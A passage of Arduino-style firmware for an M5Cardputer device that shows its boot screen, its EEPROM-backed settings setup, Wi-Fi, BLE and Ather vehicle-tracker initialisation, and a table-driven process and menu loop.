  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(10, 0);
  DISP.println("M5-ctOS");
  DISP.setTextSize(SMALL_TEXT);
  DISP.setCursor(10, 35);
  DISP.printf("%s-%s\n", NEMO_VERSION, platformName);
  DISP.setCursor(10, 55);
  DISP.println("by slmshdy");
  DISP.println(TXT_INST_NXT);
  DISP.println(TXT_INST_PRV);
  DISP.println(TXT_INST_SEL);
  DISP.println(TXT_INST_HOME);
  delay(1500);
  DISP.println(TXT_INST_PRSS_KEY);
  while(true){
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      drawmenu(mmenu, mmenu_size);
      delay(250);
      break;
    }
  }
}

// ---- Wi-Fi + Ather modules (all OS functions defined above) ----
#include "wifi_config.h"
#include "apps/ather/ather_app.h"

/// ENTRY ///
void setup() {
  Serial.begin(115200);
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
  pinMode(BACKLIGHT, OUTPUT);
  if(check_next_press()){
    clearSettings();
  }
  EEPROM.begin(EEPROM_SIZE);
  if(EEPROM.read(0) > 3 || EEPROM.read(1) > 240 || EEPROM.read(2) > 100 || EEPROM.read(4) > 19 || EEPROM.read(5) > 19) {
    Serial.println("EEPROM not properly configured. Writing defaults.");
    EEPROM.write(0, 1);    // Right rotation for cardputer
    EEPROM.write(1, 15);   // 15 second auto dim time
    EEPROM.write(2, 100);  // 100% brightness
    EEPROM.write(4, 11);   // FGColor Green
    EEPROM.write(5, 1);    // BGcolor Black
    EEPROM.commit();
  }
  rotation = EEPROM.read(0);
  screen_dim_time = EEPROM.read(1);
  brightness = EEPROM.read(2);
  setcolor(true, EEPROM.read(4));
  setcolor(false, EEPROM.read(5));

  // Pin setup
  pinMode(IRLED, OUTPUT);
  digitalWrite(IRLED, M5LED_OFF);

  // Random seed
  randomSeed(analogRead(0));

  // Wi-Fi + Ather init (non-blocking — WiFi connects in background)
  wifi_autoconnect();
  ather_auth_init();
  ather_api_init();
  ather_storage_init();
  ather_tracker_start();

  // Create the BLE Server
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  screenBrightness(brightness);
  dimtimer();
  DISP.setRotation(rotation);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  bootScreen();
}

// Wrapper functions for menuController.loop() to avoid lambda issues
void menu_controller_loop() {
  menuController.loop();
}

// Process handler structure to replace dual switch statements
struct ProcessHandler {
  int id;
  void (*setup_func)();
  void (*loop_func)();
  const char* name;
};

// Unified process table
ProcessHandler processes[] = {
  {1, mmenu_setup, menu_controller_loop, "Main Menu"},
  {2, smenu_setup, menu_controller_loop, "Settings Menu"},
  {4, dmenu_setup, menu_controller_loop, "Display Menu"},
  {6, battery_setup, battery_loop, "Battery Info"},
  {10, credits_setup, credits_loop, "Credits"},
  {16, mobiledevices_setup, mobiledevices_loop, "Mobile Devices"},
  {17, btmaelstrom_setup,   btmaelstrom_loop,   "BT Maelstrom"},
  {20, wificfg_setup,       wificfg_loop,        "Wi-Fi Config"},
  {30, ather_menu_setup,    ather_menu_loop,     "Ather Menu"},
  {31, ather_dash_setup,    ather_dash_loop,     "Ather Dashboard"},
  {32, ather_ride_setup,    ather_ride_loop,     "Last Ride"},
  {33, ather_settings_setup,ather_settings_loop, "Ather Settings"},
  {34, ather_tracker_setup, ather_tracker_loop,  "Tracker Mode"},
  {35, ather_debug_setup,   ather_debug_loop,    "Ather Debug"},
  {36, ather_history_setup, ather_history_loop,  "Ride History"},
  {37, ather_alert_setup,   ather_alert_loop,    "Ather Alert"},
  {22, color_setup, color_loop, "Color Settings"},
  {23, theme_setup, theme_loop, "Theme Settings"},
  {-1, nullptr, nullptr, nullptr} // Sentinel
};

// Run setup for current process
void runCurrentSetup() {
  for (int i = 0; processes[i].id != -1; i++) {
    if (processes[i].id == current_proc) {
      if (processes[i].setup_func) {
        processes[i].setup_func();
      }
      return;
    }
  }
}

// Run loop for current process
void runCurrentLoop() {
  for (int i = 0; processes[i].id != -1; i++) {
    if (processes[i].id == current_proc) {
      if (processes[i].loop_func) {
        processes[i].loop_func();
      }
      return;
    }
  }
}

void loop() {
  // Ather anti-theft alert check (must run before switcher)
  ather_tracker_check_alert();

  // This is the code to handle running the main loops
  // Background processes
  switcher_button_proc();
  screen_dim_proc();
  check_menu_press();
  
  // Switcher - unified process handler
  if (isSwitching) {
    isSwitching = false;
    Serial.printf("Switching To Task: %d\n", current_proc);
    runCurrentSetup();
  }

  // Main process loop - unified handler
  runCurrentLoop();
}

///////////////////////////////